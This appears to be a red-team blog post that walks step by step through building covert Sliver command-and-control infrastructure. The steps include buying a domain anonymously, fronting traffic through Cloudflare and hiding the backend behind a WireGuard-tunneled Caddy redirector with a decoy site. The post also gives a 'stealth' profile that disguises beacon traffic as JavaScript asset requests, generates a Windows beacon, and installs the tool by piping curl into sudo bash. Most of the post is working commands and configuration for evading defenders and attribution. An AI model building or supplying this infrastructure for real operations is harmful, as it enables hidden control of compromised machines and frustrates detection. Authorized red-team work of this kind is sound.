---
title: "OPSEC-Hardened Sliver C2 Infrastructure"
date: 2026-08-04 00:00:00 +0000
categories: [Red Team, C2]
tags: [sliver, c2, opsec, redirector, wireguard, cloudflare, red-team]
description: "Setting up an OPSEC-safe Sliver C2 server with redirectors, WireGuard tunneling, Cloudflare fronting, and basic host hardening for red team operations."
toc: true
---

# Setting Up an OPSEC-Safe Sliver C2 Server for Red Team Operations

In this post we walk through building a hardened Sliver C2 infrastructure.  
The goal is to keep the actual C2 server off the public internet, terminate TLS and apply filtering on a redirector, and make the traffic look as legitimate as possible so blue teams have a harder time attributing and blocking it.

## Infrastructure Mapping

```
C2 Agent
   │
   ▼
Internet
   │
   ▼
[Redirector (Public IP)]
   │  ← TLS termination, User-Agent filtering, decoy site
   │  WireGuard VPN (10.0.0.0/24)
   ▼
[Backend Sliver Server (Private IP)]
      ← Sliver listens on 10.0.0.2:8444
```

## Prerequisites

1. Domain that is at least 7 months old  
2. Two VPS instances (Ubuntu preferred)  
   - One public-facing redirector  
   - One private backend for the Sliver server  
3. Cloudflare account (free tier is sufficient)

> **OPSEC note**: Purchase the domain anonymously. Never use real personal information.  
> Blue teams routinely perform WHOIS / reverse lookups; real identity = OPSEC failure.

---

## Step 1 – Domain & Cloudflare Setup

1. Log into Cloudflare and add the domain.
2. Create A records pointing to the **redirector** public IP.
3. Enable the Cloudflare proxy (orange cloud) on those records.

---

## Step 2 – Server Hardening (Both Hosts)

### 2.1 System Update

```bash
apt update && apt upgrade -y
```

### 2.2 SSH Hardening

1. Create a non-root sudo user.
2. Generate an ED25519 key pair on your operator machine:

```bash
ssh-keygen -t ed25519 -C "operator@lab"
```

3. Copy the public key to both servers:

```bash
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server_ip
```

4. Edit `/etc/ssh/sshd_config`:

```bash
Port 2222
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM no
PermitRootLogin prohibit-password
```

5. Restart SSH:

```bash
systemctl restart sshd
```

### 2.3 Fail2Ban

```bash
apt install fail2ban -y

cat > /etc/fail2ban/jail.local << EOF
[sshd]
enabled = true
port = 2222
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
EOF

systemctl enable --now fail2ban
```

### 2.4 Unattended Security Updates

```bash
echo "unattended-upgrades unattended-upgrades/enable_auto_updates boolean true" | debconf-set-selections
dpkg-reconfigure --priority=low unattended-upgrades
```

### 2.5 Firewall Rules

**Redirector** (needs HTTP/HTTPS + SSH + WireGuard):

```bash
ufw allow 2222/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 51820/udp
ufw enable
```

**Backend** (only SSH + WireGuard – no public HTTP/HTTPS):

```bash
ufw allow 2222/tcp
ufw allow 51820/udp
ufw enable
```

> Note: Opening 80/443 on the backend defeats the purpose of the redirector.

---

## Step 3 – WireGuard VPN (Private Channel)

Create a point-to-point tunnel so the redirector can forward traffic to the backend over a private network (`10.0.0.0/24`).

### 3.1 Install WireGuard

```bash
apt install wireguard -y
```

### 3.2 Generate Keys (run on each server)

```bash
wg genkey | tee privatekey | wg pubkey > publickey
```

Keep the private and public keys for both hosts.

### 3.3 Redirector Configuration (`/etc/wireguard/wg0.conf`)

```ini
[Interface]
Address = 10.0.0.1/24
PrivateKey = <REDIRECTOR_PRIVATE_KEY>
ListenPort = 51820

[Peer]
PublicKey = <BACKEND_PUBLIC_KEY>
AllowedIPs = 10.0.0.2/32
Endpoint = <BACKEND_PUBLIC_IP>:51820
PersistentKeepalive = 25
```

### 3.4 Backend Configuration (`/etc/wireguard/wg0.conf`)

```ini
[Interface]
Address = 10.0.0.2/24
PrivateKey = <BACKEND_PRIVATE_KEY>
ListenPort = 51820

[Peer]
PublicKey = <REDIRECTOR_PUBLIC_KEY>
AllowedIPs = 10.0.0.1/32
Endpoint = <REDIRECTOR_PUBLIC_IP>:51820
PersistentKeepalive = 25
```

### 3.5 Start & Enable

```bash
systemctl enable --now wg-quick@wg0
```

Verify connectivity:

```bash
ping 10.0.0.2   # from redirector
ping 10.0.0.1   # from backend
```

## Step 4 – Redirector Setup (Caddy + User-Agent Filtering + Decoy)

The redirector terminates TLS (using Cloudflare origin certificates), serves a decoy site to normal browsers, and only proxies requests that match the implant’s User-Agent to the backend Sliver listener over the WireGuard tunnel.

### 4.1 Install Caddy

```bash
apt update
apt install -y caddy
```

### 4.2 Cloudflare Origin Certificate

1. Go to:  
   `https://dash.cloudflare.com/<account-id>/<yourdomain.com>/ssl-tls/origin/origin-certificates`
2. Create an Origin Certificate for your domain (or `*.yourdomain.com`).
3. Download both the certificate and the private key.

### 4.3 Install Certificates

```bash
mkdir -p /etc/caddy/certs
# Place cert.pem and key.pem into /etc/caddy/certs/
chmod 600 /etc/caddy/certs/key.pem
chown -R caddy:caddy /etc/caddy/certs
```

### 4.4 Decoy Website

```bash
mkdir -p /var/www/decoy
# Put a realistic static site here (company landing page, blog, etc.)
# For testing you can start with a simple placeholder:
echo "<h1>Welcome</h1><p>Legitimate looking content goes here.</p>" > /var/www/decoy/index.html
chown -R caddy:caddy /var/www/decoy
```

### 4.5 Caddyfile Configuration

Edit `/etc/caddy/Caddyfile`:

```caddy
c2.yourdomain.com {
    # Use the Cloudflare origin certificate
    tls /etc/caddy/certs/cert.pem /etc/caddy/certs/key.pem

    # Match only the implant's User-Agent
    @sliver {
        header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    # Proxy matching requests to the backend Sliver listener over WireGuard
    handle @sliver {
        reverse_proxy 10.0.0.2:8444 {
            header_up X-Forwarded-For {remote_host}
            header_up Host {host}
        }
    }

    # Everything else gets the decoy site
    handle {
        root * /var/www/decoy
        file_server
    }
}
```

> **Notes**
> - Change the User-Agent string to whatever your implant is configured to send.
> - UA filtering is trivial to bypass; treat it as a first filter, not a real access-control mechanism.
> - Make sure the Sliver listener on the backend is reachable on `10.0.0.2:8444` (bind it to the WireGuard interface or `0.0.0.0`).

### 4.6 Validate & Reload Caddy

```bash
caddy validate --config /etc/caddy/Caddyfile
systemctl reload caddy
```

Useful debugging:

```bash
systemctl status caddy
journalctl -u caddy -f
```

---

## Step 5 – Backend Sliver Server Setup

### 5.1 Install Sliver

```bash
# Official installer (handles dependencies and binary placement)
curl https://sliver.sh/install | sudo bash
```

> Optional: If you want to verify signatures yourself, install minisign first:
> ```bash
> wget https://github.com/jedisct1/minisign/releases/download/0.12/minisign-0.12-linux-amd64.tar.gz
> tar xzf minisign-0.12-linux-amd64.tar.gz
> sudo cp minisign-0.12-linux-amd64/minisign /usr/local/bin/
> sudo chmod +x /usr/local/bin/minisign
> minisign -V
> ```

### 5.2 Start Sliver & Create Listener

```bash
sliver-server
```

Inside the Sliver console:

```
# Bind to the WireGuard interface (or 0.0.0.0) so the redirector can reach it
http --lhost 10.0.0.2 --lport 8444 --domain c2.yourdomain.com
```

> **Important**: Do **not** bind only to `127.0.0.1`.  
> Caddy on the redirector proxies to `10.0.0.2:8444` over the WireGuard tunnel.  
> Binding to localhost would make the listener unreachable.

### 5.3 Create a Custom C2 Profile (Matching User-Agent)

Save the following as `/root/custom-ua.json` (or any path you prefer):

```json
{
  "implant_config": {
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "chrome_base_version": 120,
    "nonce_query_args": "abcdefghijklmnopqrstuvwxyz",
    "nonce_query_length": 1,
    "nonce_mode": "UrlParam",
    "max_files": 4,
    "min_files": 2,
    "max_paths": 4,
    "min_paths": 2,
    "max_path_length": 4,
    "min_path_length": 2,
    "extensions": ["js", "php", ""],
    "files": [
      "bootstrap", "jquery", "app", "main", "utils", "script",
      "angular", "react", "vue", "lodash", "moment", "axios"
    ],
    "paths": [
      "js", "assets", "scripts", "static", "dist", "public", "lib"
    ]
  },
  "server_config": {
    "random_version_headers": false,
    "headers": [
      {
        "name": "Cache-Control",
        "value": "no-store, no-cache, must-revalidate",
        "probability": 100,
        "method": "GET"
      }
    ],
    "cookies": [
      "JSESSIONID", "PHPSESSID", "SID", "csrf-token", "rememberMe"
    ]
  }
}
```

### 5.4 Import the Profile

Inside the Sliver console:

```
c2profiles import -n stealth -f /root/custom-ua.json
```

### 5.5 Generate a Stageless Beacon

```bash
generate beacon \
  --http https://c2.yourdomain.com \
  --c2profile stealth \
  --seconds 30 \
  --jitter 8 \
  --os windows \
  --save /tmp/beacon.exe
```

The generated implant will use the exact User-Agent defined in the `stealth` profile, which matches the filter on the Caddy redirector.



